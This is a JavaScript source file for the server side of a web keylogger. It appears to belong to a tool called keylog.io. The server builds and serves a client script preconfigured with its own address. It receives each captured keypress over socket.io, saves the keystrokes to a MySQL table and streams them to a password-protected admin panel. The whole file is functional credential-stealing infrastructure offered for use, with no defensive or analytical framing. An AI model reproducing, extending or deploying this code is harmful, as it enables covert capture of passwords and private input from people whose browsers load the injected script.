'use strict';

const { name, version } = require('../package.json');
const networkInterfaces = require('os').networkInterfaces
const http = require('http');
const path = require('path');
const express = require('express');
const mysql = require('mysql');
const moment = require('moment');
const app = express();
const basicAuth = require('express-basic-auth');


// Get the local external address
const getLocalExternalIp = () => [].concat.apply([], Object.values(networkInterfaces()))
  .filter(details => details.family === 'IPv4' && !details.internal)
  .pop().address;

// Like object assign but avoid undefined
const assignDefined = (target, ...sources) => {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      const val = source[key];
      if (val !== undefined) {
        target[key] = val;
      }
    }
  }
  return target;
}

// Server default settings
const defaults = {
  // Database connection options
  database: {
    name: 'keylogger',
    hostname: 'localhost',
    port: 3306,
    username: name,
    password: name,
    debug: false
  },
  // Administrator interface basic auth
  username: name,
  password: name,
  // Service settings
  hostname: getLocalExternalIp(),
  port: 9000,
  // serve a demo keylogger-client page
  serveDemo: false,
  // serve the keylogger client (bundled with socket.io)
  serveClient: false
};

module.exports = function(options) {
  // Init a empty variable for holding optional mysql connection
  let connection = null;

  // Init the http server with express handler
  const server = http.Server(app);

  // Clone original user defined options
  const original = Object.assign({}, options);

  // Extend default options with user supplied
  options = assignDefined({}, defaults, options);

  // Basic HTTé Authorization handler
  const authorizationFunction = basicAuth({
    challenge: true,
    users: { [`${options.username}`]: options.password }
  });

  // Create socket server
  const io = require('socket.io')(server, {
    serveClient: false
  });

  // If user passed database optios originally
  if (original.database) {
    // Create MySQL client
    connection = mysql.createConnection({
      host: options.database.hostname,
      user: options.database.username,
      password: options.database.password,
      database: options.database.name,
      debug: options.database.debug
    });

    // Test MYSQL connection
    connection.query('SELECT 1', function (error, results, fields) {
      if (error) {
        console.log('Error: MYSQL database', error.message);
        console.log('Warning: The keylog messages will not be stored.');
      } else {
        console.log('MySQL connection working successfully');
      }
    });
  }

  // Optionally serve a keylogger-client demo page
  if (options.serveDemo) {
    console.log('Serving keylogger-client DEMO page at:', `${options.hostname}:${options.port}/demo`);

    // Serve demo page
    app.use('/demo', express.static(path.join(__dirname, 'demo')));
  }

  // Serve the keylogger-client through express
  if (options.serveClient) {
    const endpoint = `${options.hostname}:${options.port}`
    const webpack = require("webpack");

    // Extend default config
    const webpackConfig = require(path.resolve(__dirname, '../webpack.config.js'));
    webpackConfig.plugins[0] = new webpack.DefinePlugin({
      SERVER_URL: JSON.stringify(endpoint)
    })

    console.log('Building the client file for:', endpoint, 'endpoint.');
    webpack(webpackConfig, (err, stats) => {
      if (err) {
        console.error('The build of the client file failed.');
        if (err.details) {
          console.error(err.details);
        }
        return;
      }

      console.log('Build ended successfully, you can find the file at:', `${options.hostname}:${options.port}/client.min.js`);
      app.get('/client.min.js', function (req, res) {
        res.sendFile(path.join(__dirname, '../dist/bundle.min.js'));
      });
    });
  }

  // Administrator private namespace
  const admin = io.of('/admin');

  // Default namespace for clients
  io.on('connection', function (socket) {
    console.log('A new socket has connected:', socket.id);

    // Listen for keylogs
    socket.on('keypress', (data) => {
      console.debug('A new keylog received from:', data.hostname, 'key pressed:', data.key);

      // Clone object
      let mysqlData = Object.assign({}, data);
      mysqlData.timestamp = moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')

      // Save the keypress to DB or queue
      if (connection && connection.state !== 'disconnected') {
        connection.query('INSERT INTO keylogs SET ?', mysqlData, function (error, results, fields) {
          if (error) {
            console.log('Error while saving keylog event to database.');
            console.log(error);
          }
        });
      }

      // Emit to channel
      admin.emit('keylog', data);
    });
  });

  // Serve the keylog.io administration panel
  app.get('/', authorizationFunction, (req, res) => {
    res.sendFile(path.join(__dirname, '/../dist/index.html'));
  });
  app.use(express.static(path.join(__dirname, '/../dist')));

  // Start express socket server
  server.listen(options.port, '0.0.0.0', () => {
    console.log('Server started and listening on:', `${options.hostname}:${options.port}`);
  });
};
